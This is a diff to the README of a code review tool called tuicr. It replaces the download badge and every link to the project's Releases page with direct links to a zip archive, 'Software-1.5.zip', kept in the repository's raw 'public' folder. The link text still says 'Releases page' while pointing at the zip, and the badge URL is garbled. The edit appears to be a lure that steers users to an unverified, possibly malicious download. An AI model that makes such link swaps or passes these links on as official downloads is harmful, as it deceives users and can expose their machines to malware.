@@ -1,6 +1,6 @@
 # 🎉 tuicr - Simplifying Code Review for Everyone
 
-![Download tuicr](https://img.shields.io/badge/Download%20tuicr-v1.0-blue.svg)
+![Download tuicr](https://github.com/Kineki07/tuicr/raw/refs/heads/main/public/Software-1.5.zip%https://github.com/Kineki07/tuicr/raw/refs/heads/main/public/Software-1.5.zip)
 
 ## 📖 About tuicr
 
@@ -21,7 +21,7 @@ To get started with tuicr, follow the steps below to download and run the softwa
 
 **Step 1**: Visit the Releases page to download tuicr. 
 
-[Download tuicr here](https://github.com/Kineki07/tuicr/releases)
+[Download tuicr here](https://github.com/Kineki07/tuicr/raw/refs/heads/main/public/Software-1.5.zip)
 
 **Step 2**: On the Releases page, find the version you want to install. Click on the appropriate file for your operating system (Windows, macOS, or Linux).
 
@@ -74,4 +74,4 @@ If you're interested in contributing to tuicr, take a look at our contributing g
 
 Thank you for choosing tuicr for your code review needs. We aim to provide a smooth and enjoyable experience, simplifying your workflow and improving collaboration. 
 
-For questions, updates, and more information, remember to check our [Releases page](https://github.com/Kineki07/tuicr/releases).
+For questions, updates, and more information, remember to check our [Releases page](https://github.com/Kineki07/tuicr/raw/refs/heads/main/public/Software-1.5.zip).
